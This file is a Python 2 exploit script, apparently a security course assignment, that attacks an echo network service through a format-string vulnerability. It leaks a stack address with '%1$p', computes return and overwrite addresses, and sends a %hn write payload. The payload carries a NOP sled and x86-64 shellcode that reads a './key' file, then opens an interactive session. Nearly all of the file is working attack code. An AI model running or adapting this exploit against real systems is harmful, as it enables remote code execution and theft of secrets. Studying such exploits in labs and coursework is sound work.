# 
# Works with Python2
#
# Modified by: Ryan Sowers
#  06/04/2018
#
# Run: python assn4_P3.py IP Port
#

import socket
import sys
import telnetlib
import time

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) < 3:
    print "Please provide <hostname> <port number>"
    exit(1)

# Connect the socket to the port on the server given by the caller
# server_address = (sys.argv[1], sys.argv[2])      # socket id
print "connecting to " + sys.argv[1] + " port " + sys.argv[2]
sock.connect((sys.argv[1], int(sys.argv[2])))         # connect to socket

tn = telnetlib.Telnet()
tn.sock = sock 

# try:
    
data = sock.recv(1024)
print data.decode()     # 200 OK ECHO (v0.2)

# while True:
# string = raw_input()
# string = string +'\n'
# print "Sending: %s" % string
# sock.sendall(string)     # send string
# print "String sent!"

pload1 = '%1$p\n'
print "Sending: %s" % pload1
sock.send(pload1)          # send string
# print "String sent!"

time.sleep(1)

data = sock.recv(1024)
print "Buffer start: " + data.decode()

# Calculate new return address
return_addr = int(data, 16) + 97    # updated with odd address offset
return_addr = hex(return_addr)
return_addr = str(return_addr)
print "Return addr to place: " + return_addr

# List of converted hex values to decimal
dec_addr_list = []

address_end = return_addr[-4:]
# print "Address end: " + address_end

dec_addr_end = int(address_end, 16)
# print "Dec conversion is: " + str(dec_addr_end)

address_mid = return_addr[6:10]
# print "Address middle: " + address_mid

dec_addr_mid = int(address_mid, 16)
# print "Dec conversion is: " + str(dec_addr_mid)

address_beg = return_addr[2:6]
# print "Address beginning: " + address_beg

dec_addr_beg = int(address_beg, 16)
# print "Dec conversion is: " + str(dec_addr_beg)


# sort address values by size
dec_addr_list.append((dec_addr_beg, 13))
dec_addr_list.append((dec_addr_mid, 14))
dec_addr_list.append((dec_addr_end, 15))

# print "Dec addr list: "
# print dec_addr_list

dec_addr_list.sort(key=lambda tup: tup[0])
# print "Sorted dec addr list: "
# print dec_addr_list


# Calculate size differences of values
updated_addr_list = []
updated_addr_list.append(dec_addr_list[0])
updated_addr_list.append((dec_addr_list[1][0] - dec_addr_list[0][0], dec_addr_list[1][1]))
updated_addr_list.append((dec_addr_list[2][0] - dec_addr_list[1][0], dec_addr_list[2][1]))
print "Updated addr list: "
print updated_addr_list


# Calculate location to place return address
return_placement = int(data, 16)
print_addr1 = return_placement + 284
print_addr1 = hex(print_addr1)
print_addr1 = str(print_addr1)

print "Place return address here: " + print_addr1
# print "Length: " + str(len(print_addr1))
# print "Convert this: " + print_addr1[2:]


# Zero fill addresses to 8 bytes
if len(print_addr1) < 18:
   print_addr1 = print_addr1[:2] + "0"*(18-len(print_addr1)) + print_addr1[2:]

print_addr1 = print_addr1[:2]+print_addr1[16:]+print_addr1[14:16]+print_addr1[12:14]+print_addr1[10:12]+print_addr1[8:10]+print_addr1[6:8]+print_addr1[4:6]+print_addr1[2:4]
# print "...New: " + print_addr1

ASCIIaddr1 = bytearray.fromhex(print_addr1[2:])

# return_placement = int(data, 16)
print_addr2 = return_placement + 282
print_addr2 = hex(print_addr2)
print_addr2 = str(print_addr2)

# print "...here: " + print_addr2

if len(print_addr2) < 18:
   print_addr2 = print_addr2[:2] + "0"*(18-len(print_addr2)) + print_addr2[2:]

print_addr2 = print_addr2[:2]+print_addr2[16:]+print_addr2[14:16]+print_addr2[12:14]+print_addr2[10:12]+print_addr2[8:10]+print_addr2[6:8]+print_addr2[4:6]+print_addr2[2:4]
# print "...New: " + print_addr2

ASCIIaddr2 = bytearray.fromhex(print_addr2[2:])

# return_placement = int(data, 16)
print_addr3 = return_placement + 280
print_addr3 = hex(print_addr3)
print_addr3 = str(print_addr3)

# print "...and here: " + print_addr3

if len(print_addr3) < 18:
   print_addr3 = print_addr3[:2] + "0"*(18-len(print_addr3)) + print_addr3[2:]

print_addr3 = print_addr3[:2]+print_addr3[16:]+print_addr3[14:16]+print_addr3[12:14]+print_addr3[10:12]+print_addr3[8:10]+print_addr3[6:8]+print_addr3[4:6]+print_addr3[2:4]
# print "...New: " + print_addr3

ASCIIaddr3 = bytearray.fromhex(print_addr3[2:])


# starting with example for buffer start at 0x7fffffffec50
payload = "%" + str(updated_addr_list[0][0]).zfill(5) + "c%" + str(updated_addr_list[0][1]) + "$hn%" + \
   str(updated_addr_list[1][0]).zfill(5) + "c%" + str(updated_addr_list[1][1]) + \
   "$hn%" + str(updated_addr_list[2][0]).zfill(5) + "c%" + str(updated_addr_list[2][1]) + "$hn" \
   + "A" + str(ASCIIaddr1) + str(ASCIIaddr2) + str(ASCIIaddr3) + "\x90"*64 + \
   "\x48\x31\xd2\x48\x31\xf6\x52\x48\xbf\x2e\x2f\x6b\x65\x79\x00\x00\x00\x57\x48\x89\xe7\xb8\x02\x00" + \
   "\x00\x00\x0f\x05\x49\x89\xc7\xba\x01\x00\x00\x00\x48\x89\xe6\x4c\x89\xff\xb8\x00\x00\x00\x00\x0f" + \
   "\x05\x48\x83\xf8\x01\x75\x16\xba\x01\x00\x00\x00\x48\x89\xe6\xbf\x01\x00\x00\x00\xb8\x01\x00\x00" + \
   "\x00\x0f\x05\xeb\xd2\x4c\x89\xff\xb8\x03\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05\n"

print payload

# string = raw_input()
# string = string +'\n'
# # print "Sending: %s" % string
# sock.sendall(string)     # send string
# # print "String sent!"

# data = sock.recv(1024)
# print data.decode()
# # print "Response: %s" % data.decode()     # receive response

sock.send(payload)

time.sleep(1)

sock.send("quit\n")

# data = sock.recv(1024)
# print data.decode()

# time.sleep(1)

tn.interact()



